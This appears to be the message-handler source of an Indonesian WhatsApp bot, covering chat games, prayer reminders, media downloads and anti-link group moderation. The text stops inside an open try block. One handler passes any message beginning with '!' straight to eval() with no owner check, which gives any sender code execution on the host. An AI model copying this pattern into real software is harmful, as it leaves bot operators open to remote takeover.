/*
    CREDIST !!!
        > Hw Mods [ Base ]
        > 𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖 [ Developer ]

    SAYA SANGAT BERTERIMA KASIH JIKA KALIAN MEMBIARKAN CREDIT INI TANMPA MENGHAPUS ATAU MENGGANTI NYA 
    TOLONG HARGAI YAA
    
WA ME : https://wa.me/6282173242194
TE ME : https://t.me/InzieOfc_x_hosting
YT ME : https://www.youtube.com/@InzieOfcHosting
SALURAN WA : https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k
    
WOI JB KONTOL JANGAN DI JUAL BANGSAT 🤬

*/
process.on('uncaughtException', console.error)
require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const cron = require('node-cron')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const tkApi = require('@tobyg74/tiktok-api-dl')
const { URL_REGEX } = require('@whiskeysockets/baileys')
const { fileTypeFromBuffer } = require('file-type')
const PhoneNumber = require('awesome-phonenumber')
const { Pixiv } = require('@ibaraki-douji/pixivts')
const pixiv = new Pixiv()
const bingi = require('bing-scraper')
const phd = require('@justalk/pornhub-api')
const xfar = require('xfarr-api')
const dylux = require('api-dylux')
const nou = require("node-os-utils");
const dhn = require('dhn-api')
const g4f = require("g4f")
const path = require('path')
const { pipeline } = require('stream')
const { promisify } = require("util")
const jimp = require('jimp')
const kotz = require("kotz-api");
const zsExtract = require('zs-extract')
const acrcloud = require('acrcloud')
const { ocrSpace } = require('ocr-space-api-wrapper')
const mann = require('d-scrape')
const content = JSON.stringify(m.message)
const isQuotedViewonce = m.quoted ? content.includes('viewOnceMessage') ? true : false : true
const { youtubedl, youtubedl2 } = require('@bochilteam/scraper-sosmed')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const maker = require('mumaker')
const yts = require("yt-search")
const jsobfus = require('javascript-obfuscator')
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { addExif } = require('./lib/exif')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins,generateProfilePicture, toRupiah, shorturl, enumGetKey, sort,pickRandom, toNumber, randomNumber } = require('./lib/myfunc')
const { TelegraPH } = require("./lib/TelegraPH")
const { search, ytmp3, ytmp4 } = require('./lib/searchyt')
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const { ssweb, tiktok, remini,findSongs } = require("./lib/scraper")
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')
//=================================================//
module.exports = RezzHost = async (RezzHost, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//WM By Rulzz, Titenono lek ko hapus le😹
 async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: RezzHost.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, RezzHost.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'}
RezzHost.ev.emit('messages.upsert', msg)}
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ''
//=================================================//
const Styles = (text, style = 1) => {
var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
};
var replacer = [];
xStr.map((v, i) =>
replacer.push({
original: v,
convert: yStr[style].split('')[i]
})
);
var str = text.toLowerCase().split('');
var output = [];
str.map((v) => {
const find = replacer.find((x) => x.original == v);
find ? output.push(find.convert) : output.push(v);
});
return output.join('');
};
const pushname = m.pushName || "No Name"
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await RezzHost.decodeJid(RezzHost.user.id)
const isRegistered = checkRegisteredUser(m.sender)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await RezzHost.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const jangan = m.isGroup ? ntilink.includes(m.chat) : false	
const welcm = m.isGroup ? wlcm.includes(from) : false
const chat = m.isGroup?[m.chat] : false
const qmsg = (quoted.msg || quoted)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const qtod = m.quoted? "true":"false"
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Makassar').format('dddd, DD MMMM YYYY')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')


const time2 = moment().tz('Asia/Makassar').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🏙️'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang 🌆'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌇'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🌤️'
}
if(time2 < "10:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Subuh 🌆'
}
if(time2 < "03:00:00"){
var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}
//=================================================//
// function

//SKREP
const { bard } = require('./lib/bard')

//================== [ RESPON ALL GAME ] ==================//

const kalgans = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `${botname}`,
jpegThumbnail: "",
}
}}

const reply2 = (teks) => {
RezzHost.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: 'RezzHost In Here',
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./media/Rezz.jpg"),
caption: `\n${teks}`,
}, { quoted: kalgans,ephemeralExpiration: 86400});
}

async function reply(teks) {
const nedd = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: global.botname,
newsletterJid: global.idcennel,
},
externalAdReply: {  
showAdAttribution: true,
title: `${botname}`,
body: "RISKY OFC",
previewType: "VIDEO",
thumbnailUrl: thumbnail, 
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k", 
},
},
text: teks,
};
return RezzHost.sendMessage(m.chat, nedd, {
quoted: kalgans,
});
}

try {
let id = m.chat;
let timeout = 180000;
let hadiah = randomNumber(10000, 20000);
let users = global.db.data.users[m.sender];
let budy = typeof m.body == 'string' ? m.body : false;
RezzHost.bomb = RezzHost.bomb ? RezzHost.bomb : {};

if (RezzHost.bomb[id] && !isNaN(body) && !isCmd) {
let json = RezzHost.bomb[id][1].find(v => v.position == body);
if (!json) return
if (json.emot == '💥') {
json.state = true;
let bomb = RezzHost.bomb[id][1];
let teks = `*DUARRRRRR 💥*\n\n`;
teks += bomb.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `@${m.sender.split("@")[0]} membuka kotak yang berisi *Bom* Game di hentikan!`
RezzHost.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/da5e5612ccead39af2e93.jpg", title: " 🎮  𝗚 𝗔 𝗠 𝗘 - 𝗧 𝗘 𝗕 𝗔 𝗞 - 𝗕 𝗢 𝗢 𝗠  🎮", body: null, renderLargerThumbnail: true, sourceUrl: null, mediaType: 1}}}, {quoted: kalgans}).then(() => {
clearTimeout(RezzHost.bomb[id][2]);
delete RezzHost.bomb[id];
});
} else if (json.state) {
return RezzHost.sendText(m.chat, `Kotak ${json.number} sudah di buka silahkan pilih kotak yang lain!`, m);
} else {
json.state = true;
let changes = RezzHost.bomb[id][1];
let open = changes.filter(v => v.state && v.emot != '💥').length;

if (open >= 8) {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `*Permainan selesai!* kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

RezzHost.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
clearTimeout(RezzHost.bomb[id][2]);
delete RezzHost.bomb[id];
});
} else {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `Waktu : *${((timeout / 1000) / 60)} menit*\n`;
teks += `Kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

RezzHost.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
});
}
}
}
} catch (e) {
return RezzHost.sendText(m.chat, e.toString(), m);
}

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
db.data.users[m.sender].balance += hadiah
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

try {
let roof = Object.values(suit).find(v => v.status && [v.penantang, v.ditantang].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.ditantang && m.isGroup && roof.status == 'WAIT') {
if (body.toLowerCase() === 'y') {
roof.status = 'PLAY'
roof.asal = m.chat
clearTimeout(roof.waktu)
uselimit()
await RezzHost.sendMessage(m.chat, {text: 'Suit telah dikirimkan ke chat\nSilahkan pilih suit di chat masing²', contextInfo: {mentionedJid: [roof.ditantang, roof.penantang]}}, {quoted: m})
if (!roof.pilih1) await RezzHost.sendText(roof.penantang, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
if (!roof.pilih2) await RezzHost.sendText(roof.ditantang, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await RezzHost.sendMessage(m.chat, {text: `Kedua pemain tidak niat main!\nGame suit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.ditantang : roof.penantang
await RezzHost.sendMessage(m.chat, {text: `@${(roof.pilih ? roof.ditantang : roof.penantang).split('@')[0]} tidak memilih suit\nGame suit dibatalkan`, contextInfo: {mentionedJid: [roof.ditantang, roof.penantang]}}, {quoted: kalgans})
}
delete suit[roof.id]
return !0
}, roof.timeout)
} else if (body.toLowerCase() === 'n') {
await RezzHost.sendMessage(m.chat, {text: `@${roof.ditantang.split('@')[0]} menolak suit, suit dibatalkan`, contextInfo: {mentionedJid: [roof.ditantang]}}, {quoted: m})
delete suit[roof.id]
return !0
}
}
let jwb = m.sender == roof.penantang
let jwb2 = m.sender == roof.ditantang
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(budy) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(budy.toLowerCase())[0]
roof.text = budy
await RezzHost.sendMessage(m.chat, {text: `Kamu telah memilih *${budy}* ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted: m})
if (!roof.pilih2) await RezzHost.sendMessage(roof.ditantang, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(budy) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(budy.toLowerCase())[0]
roof.text2 = budy
await RezzHost.sendMessage(m.chat, {text: `Kamu telah memilih *${budy}* ${!roof.pilih ? '\n\nMenunggu lawan memilih' : ''}`}, {quoted: m})
if (!roof.pilih) await RezzHost.sendMessage(roof.penantang, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.penantang
else if (b.test(stage) && k.test(stage2)) win = roof.ditantang
else if (g.test(stage) && k.test(stage2)) win = roof.penantang
else if (g.test(stage) && b.test(stage2)) win = roof.ditantang
else if (k.test(stage) && b.test(stage2)) win = roof.penantang
else if (k.test(stage) && g.test(stage2)) win = roof.ditantang
else if (stage == stage2) tie = true
let teks = `*🎮 GAME SUIT 🎮*\n\n${tie ? '*HASIL SERI*\n\n' : ''}@${roof.penantang.split('@')[0]} (${roof.text}) ${tie ? '' : roof.penantang == win ? ' Menang' : ' Kalah'}\n@${roof.ditantang.split('@')[0]} (${roof.text2}) ${tie ? '' : roof.ditantang == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah : *$' + roof.hadiah + '* balance'}`
await RezzHost.sendMessage(roof.asal, {text: teks, contextInfo: {mentionedJid: [roof.ditantang, roof.penantang]}}, {quoted: roof.chat})
if (roof.penantang == win) {
global.db.data.users[roof.penantang].balance += roof.hadiah
} else if (roof.ditantang == win) {
global.db.data.users[roof.ditantang].balance += roof.hadiah
}
delete suit[roof.id]
}
}
} catch (e) {
return reply(e)
}

const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}
const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}
const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}
const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}
const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}
if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
RezzHost.sendText(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
db.data.users[m.sender].balance -= 100
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -100 balance karna menolak ajakan pemain`
RezzHost.sendText(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the2, m)
global.db.data.users[posi.penantang].balance += posi.hadiah
global.db.data.users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
RezzHost.sendText(from, the4, m)

tictactoe[from].status = false
}}}}} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the5, m)
global.db.data.users[posi.ditantang].balance += posi.hadiah
global.db.data.users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
RezzHost.sendText(from, the7, m)

tictactoe[from].status = true
}}}}}}} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}}
//BATAS RESPON GAME

RezzHost.autoshalat = RezzHost.autoshalat ? RezzHost.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? RezzHost.user.id : m.sender
	let id = m.chat 
    if(id in RezzHost.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '14:49',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Yogyakarta dan sekitarnya._`
    RezzHost.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete RezzHost.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await RezzHost.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: kalgans })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}    

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await RezzHost.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: kalgans })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

jarakkota = (dari, ke) => {
   return new Promise(async (resolve, reject) => {
	var html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	var $ = cheerio.load(html), obj = {}
	var img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	resolve(obj)
   })
}


if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await RezzHost.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return RezzHost.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return RezzHost.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return RezzHost.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await RezzHost.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
RezzHost.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
RezzHost.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}


//BATAS
if (global.onlypc) {
        	if (command&!m.isGroup){
	         return reply(`RISKY OFCs dalam mode private, gunakan di private chat!`)
	     }
	}
//=================================================//
if (!RezzHost.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
RezzHost.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m RISKY OFC \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: RezzHost.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, RezzHost.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
RezzHost.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await RezzHost.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

try {
